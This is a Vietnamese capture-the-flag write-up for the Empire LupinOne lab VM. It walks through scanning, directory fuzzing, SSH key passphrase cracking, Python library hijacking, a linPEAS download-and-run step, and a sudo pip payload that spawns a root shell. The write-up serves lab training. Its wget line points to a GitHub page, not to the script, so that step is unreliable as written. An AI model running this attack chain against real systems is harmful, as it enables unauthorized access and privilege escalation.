# Lab
**I. EMPIRE LUPIN ONE**
Nguồn hướng dẫn:[Đây](https://www.hackingarticles.in/empire-lupinone-vulnhub-walkthrough/)
1. Tìm kiếm mục tiêu, quét cổng
   Đầu tiên dùng netdiscover tool để khám phá mạng xung quanh, tìm địa chỉ IP mục tiêu:
   `netdiscover`
   Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:
   `nmap -sC -sV 192.168.1.4`
   ![image](https://github.com/tninh27/Lab/assets/105789492/f20bdbc8-360a-4bec-9106-99a9aafe3fee)
  Ta có:
  - cổng 22 có máy chủ SSH
  - cổng 80 có dịch vụ HTTP (Apache Server), một thư mục /~myfiles
2. Liệt kê
  Dùng trình duyệt xem folder /~myfiles:
  ![image](https://github.com/tninh27/Lab/assets/105789492/3ed47e03-fa62-4b7a-86c6-f6f5b4dd5568)
  Thử xem bằng chế độ view-source:
  ![image](https://github.com/tninh27/Lab/assets/105789492/28c2d911-58d7-49af-85fa-274503a15888)
  - Đã có gợi ý đầu tiên
  Dùng kỹ thuật Fuzzing với ffuf tool, xem các thư mục:
  `ffuf -c -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt -u 'http://192.168.1.4/~FUZZ'`
  ![image](https://github.com/tninh27/Lab/assets/105789492/ff4b2830-82c3-491a-9ee2-86627c65f0cf)
  - Tìm thấy thư mục bí ẩn secret, mở bằng trình duyệt:
  ![image](https://github.com/tninh27/Lab/assets/105789492/2ae6fe73-c722-41a7-a28f-4f746c62e0ec)
  - Gợi ý tên tài khoản đăng nhập là: icex64, khóa sshkey
  Để tìm khóa ssh  đó, tiếp tục sử dụng fuzzing với ffuf tool :
  `ffuf -c -ic -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt -u 'http://192.168.1.4/~secret/.FUZZ' -fc 403 -e .txt,.html`
  ![image](https://github.com/tninh27/Lab/assets/105789492/e03160b8-ab89-40bd-a163-86fe5112a5de)
  - Tìm thấy tệp bí mật secret.txt, mở bằng trình duyệt:
  ![image](https://github.com/tninh27/Lab/assets/105789492/7a80106b-63d8-4343-be97-13c76bc3b08f)
  - Tìm được 1 đoạn mã code base58, giải mã nó ta được khóa ssh sau
  ![image](https://github.com/tninh27/Lab/assets/105789492/e4ef6819-5fc8-42e3-a84b-b4b835f78e41)
  Tiến hành lưu trữ lại khóa tìm được này vào file *ssh*
3. Khai thác
  Dùng ssh2john, băm file *sshkey* vào file *hash* :
  `/usr/share/john/ssh2john.py sshkey > hash`
   Dùng john, bẻ khóa giá trị băm:
  `john --wordlist=/usr/share/wordlists/fasttrack.txt hash`
  ![image](https://github.com/tninh27/Lab/assets/105789492/cc291c25-80fb-4c8e-ac2a-a7331c2005da)
  - Mật khẩu: P@55w0rd!
  Đăng nhập tài khoản *icex64* bằng khóa *sshkey* và mật khẩu vừa tìm được:
  `ssh -i sshkey icex64@192.168.1.4 `
  ![image](https://github.com/tninh27/Lab/assets/105789492/4aea8796-5900-4f89-99cc-4a537defdc5a)
  Kiểm tra quyền:
  `sudo -l`
  ![image](https://github.com/tninh27/Lab/assets/105789492/eaa6b75c-aa5b-4865-bb11-123451aecc52)
  - Tìm được người dùng arsense có thể khai thác bằng các chiếm thư viện python
  Xem nội dung file heist.py:
  ![image](https://github.com/tninh27/Lab/assets/105789492/f854b90d-b81d-4f45-9a8d-a11ddd1eb19f)
4. Leo thang đặc quyền
  Tải Linpeas tool từ Github, cấp quyền thực thi cho nó: [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
  `wget https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS`
  `chmod +x ./linpeas.sh`
  Tiến hành chạy linpeas:
	`./linpeas.sh`
  ![image](https://github.com/tninh27/Lab/assets/105789492/12216f46-ebf6-4888-8983-66dea24c3530)
  - Tìm được đường dẫn thư mục thư viện python
  Dùng nano sửa file trên, thêm lệnh /bin/bash:
  ![image](https://github.com/tninh27/Lab/assets/105789492/22d716ac-8a01-49ab-a8a5-c664d9cfdc70)
  Chuyển người dùng icex64 sang arsene:
  `sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py `
  ![image](https://github.com/tninh27/Lab/assets/105789492/f8f4b692-7a97-4faf-94ce-df9486abaf45)
  Kiểm tra quyền tài khoản arsene:
  `sudo -l `
  ![image](https://github.com/tninh27/Lab/assets/105789492/9b0646cf-cc53-4520-874d-88d289923f9f)
  - Thấy có quyền thực thi nhị phân pip mà không cần xác minh root, tiến hành leo thang đặc quyền:
  ```TF=$(mktemp -d)
  echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
  sudo pip install $TF```
  ![image](https://github.com/tninh27/Lab/assets/105789492/055efa6f-b949-4888-9681-f32caf49769e)
  - Đã đăng nhập tài khoản root, xem file root.txt:
  ![image](https://github.com/tninh27/Lab/assets/105789492/0d60f705-2c87-4cd3-9c38-f556889ec9f0)



















